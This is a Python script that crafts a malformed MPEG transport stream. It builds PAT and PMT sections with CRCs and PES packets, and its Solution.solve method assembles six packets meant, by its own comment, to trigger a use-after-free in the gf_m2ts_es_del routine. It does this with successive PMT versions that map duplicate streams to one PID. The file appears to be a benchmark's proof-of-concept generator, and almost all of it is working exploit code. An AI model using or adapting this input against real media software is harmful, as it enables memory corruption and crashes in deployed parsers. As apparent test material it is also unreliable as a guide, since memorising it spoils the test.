import struct
import tarfile
from typing import List

def mpeg_crc32(data: bytes) -> int:
    crc = 0xFFFFFFFF
    poly = 0x04C11DB7
    for b in data:
        crc ^= (b << 24) & 0xFFFFFFFF
        for _ in range(8):
            if (crc & 0x80000000) != 0:
                crc = ((crc << 1) ^ poly) & 0xFFFFFFFF
            else:
                crc = (crc << 1) & 0xFFFFFFFF
    return crc & 0xFFFFFFFF

def build_pat_section(pmt_pid: int, tsid: int = 1, version: int = 0) -> bytes:
    body = bytearray()
    body += struct.pack(">H", tsid)
    ver_cni = (0x03 << 6) | ((version & 0x1F) << 1) | 0x01
    body.append(ver_cni)
    body.append(0x00)  # section_number
    body.append(0x00)  # last_section_number
    # program_number and PMT PID
    body += struct.pack(">H", 1)
    pid_hi = 0xE0 | ((pmt_pid >> 8) & 0x1F)
    pid_lo = pmt_pid & 0xFF
    body += bytes([pid_hi, pid_lo])

    section_length = len(body) + 4  # CRC included
    header = bytearray()
    header.append(0x00)  # table_id for PAT
    header.append(0xB0 | ((section_length >> 8) & 0x0F))
    header.append(section_length & 0xFF)
    section_wo_crc = bytes(header + body)
    crc = mpeg_crc32(section_wo_crc)
    section = section_wo_crc + struct.pack(">I", crc)
    return section

def build_pmt_section(program_number: int, version: int, pcr_pid: int, es_list: List[tuple]) -> bytes:
    body = bytearray()
    body += struct.pack(">H", program_number)
    ver_cni = (0x03 << 6) | ((version & 0x1F) << 1) | 0x01
    body.append(ver_cni)
    body.append(0x00)  # section_number
    body.append(0x00)  # last_section_number

    # PCR PID
    body.append(0xE0 | ((pcr_pid >> 8) & 0x1F))
    body.append(pcr_pid & 0xFF)

    # program_info_length = 0
    body.append(0xF0)
    body.append(0x00)

    for stype, epid in es_list:
        body.append(stype & 0xFF)
        body.append(0xE0 | ((epid >> 8) & 0x1F))
        body.append(epid & 0xFF)
        # ES_info_length = 0
        body.append(0xF0)
        body.append(0x00)

    section_length = len(body) + 4  # CRC included
    header = bytearray()
    header.append(0x02)  # table_id for PMT
    header.append(0xB0 | ((section_length >> 8) & 0x0F))
    header.append(section_length & 0xFF)
    section_wo_crc = bytes(header + body)
    crc = mpeg_crc32(section_wo_crc)
    section = section_wo_crc + struct.pack(">I", crc)
    return section

def make_ts_packet(pid: int, payload: bytes, pusi: int, cc: int) -> bytes:
    # 188 bytes: 4 header + 184 payload
    # For PSI with pusi=1, payload should start with pointer_field
    header = bytearray(4)
    header[0] = 0x47
    header[1] = ((pusi & 1) << 6) | ((pid >> 8) & 0x1F)
    header[2] = pid & 0xFF
    header[3] = 0x10 | (cc & 0x0F)  # payload only, no adaptation
    # Ensure payload fits into 184
    if len(payload) > 184:
        # Shouldn't happen in our controlled construction
        payload = payload[:184]
    stuffing_len = 184 - len(payload)
    stuffing = b'\xFF' * stuffing_len
    return bytes(header) + payload + stuffing

def pack_section_into_ts(pid: int, section: bytes, cc_start: int) -> (List[bytes], int):
    # We keep it in a single TS packet. PUSI=1, pointer_field=0
    payload = bytes([0x00]) + section
    pkt = make_ts_packet(pid, payload, pusi=1, cc=cc_start)
    return [pkt], (cc_start + 1) & 0x0F

def build_pes_packets(pid: int, cc_start: int, payload_size_first: int = 100, payload_size_second: int = 120) -> (List[bytes], int):
    packets = []
    # PES start
    pes_header = bytearray()
    pes_header += b'\x00\x00\x01'
    pes_header.append(0xE0)  # video stream id
    pes_header += b'\x00\x00'  # PES_packet_length = 0 (unbounded)
    pes_header += b'\x80\x00\x00'  # '10' + flags, header_data_length=0
    payload1 = bytes(pes_header) + b'\x00' * max(0, payload_size_first)
    packets.append(make_ts_packet(pid, payload1, pusi=1, cc=cc_start))
    cc = (cc_start + 1) & 0x0F
    # Continuation without PUSI
    payload2 = b'\x00' * max(0, payload_size_second)
    packets.append(make_ts_packet(pid, payload2, pusi=0, cc=cc))
    cc = (cc + 1) & 0x0F
    return packets, cc

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Attempt to trigger gf_m2ts_es_del UAF via crafted TS:
        # - PAT mapping to PMT PID 0x0100
        # - PMT v0 with two streams (0x0101, 0x0102)
        # - PMT v1 with duplicate ES entries both using PID 0x0101
        # - PES packets for PID 0x0101
        # - PMT v2 reinforcing duplicate mapping
        # Total: 6 TS packets (1128 bytes)
        cc_map = {}
        def next_cc(pid: int) -> int:
            cc = cc_map.get(pid, 0)
            cc_map[pid] = (cc + 1) & 0x0F
            return cc

        packets = []

        # PAT
        pat_section = build_pat_section(pmt_pid=0x0100, tsid=1, version=0)
        cc = cc_map.get(0x0000, 0)
        pat_pkts, cc_new = pack_section_into_ts(0x0000, pat_section, cc)
        packets.extend(pat_pkts)
        cc_map[0x0000] = cc_new

        # PMT v0: PIDs 0x0101 and 0x0102
        pmt_v0 = build_pmt_section(program_number=1, version=0, pcr_pid=0x0101,
                                   es_list=[(0x1B, 0x0101), (0x04, 0x0102)])
        cc = cc_map.get(0x0100, 0)
        pmt0_pkts, cc_new = pack_section_into_ts(0x0100, pmt_v0, cc)
        packets.extend(pmt0_pkts)
        cc_map[0x0100] = cc_new

        # PMT v1: duplicate ES entries both PID 0x0101
        pmt_v1 = build_pmt_section(program_number=1, version=1, pcr_pid=0x0101,
                                   es_list=[(0x1B, 0x0101), (0x04, 0x0101)])
        cc = cc_map.get(0x0100, 0)
        pmt1_pkts, cc_new = pack_section_into_ts(0x0100, pmt_v1, cc)
        packets.extend(pmt1_pkts)
        cc_map[0x0100] = cc_new

        # PES start for PID 0x0101
        cc = cc_map.get(0x0101, 0)
        pes_pkts, cc_new = build_pes_packets(0x0101, cc, payload_size_first=60, payload_size_second=60)
        packets.append(pes_pkts[0])
        # We'll add the second PES packet later to keep total at 6 packets
        cc_map[0x0101] = cc_new

        # PMT v2: reinforce duplicated ES mapping
        pmt_v2 = build_pmt_section(program_number=1, version=2, pcr_pid=0x0101,
                                   es_list=[(0x1B, 0x0101), (0x04, 0x0101)])
        cc = cc_map.get(0x0100, 0)
        pmt2_pkts, cc_new = pack_section_into_ts(0x0100, pmt_v2, cc)
        packets.extend(pmt2_pkts)
        cc_map[0x0100] = cc_new

        # Add the second PES continuation to make 6 packets total
        packets.append(pes_pkts[1])

        # Ensure exactly 6 packets
        packets = packets[:6]
        data = b''.join(packets)

        # Guarantee size is 6 * 188 = 1128
        if len(data) < 6 * 188:
            data += b'\xFF' * (6 * 188 - len(data))
        elif len(data) > 6 * 188:
            data = data[:6 * 188]
        return data